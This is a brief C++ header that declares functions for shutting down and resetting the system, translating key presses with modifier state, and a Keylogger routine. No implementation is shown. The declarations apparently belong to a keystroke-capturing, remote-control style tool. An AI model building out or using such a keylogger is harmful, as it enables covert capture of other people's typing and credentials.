#pragma once
#ifndef WINDOWAPI_H
#define WINDOWAPI_H
#include "Header.h"


void ShutdownSystem();
void ResetSystem();
string TranslateKey(int key, bool capsLock, bool shiftPressed, bool winPressed);
void Keylogger(bool& isTurnOn, bool& appOn);

#endif // !WINDOWAPI_H
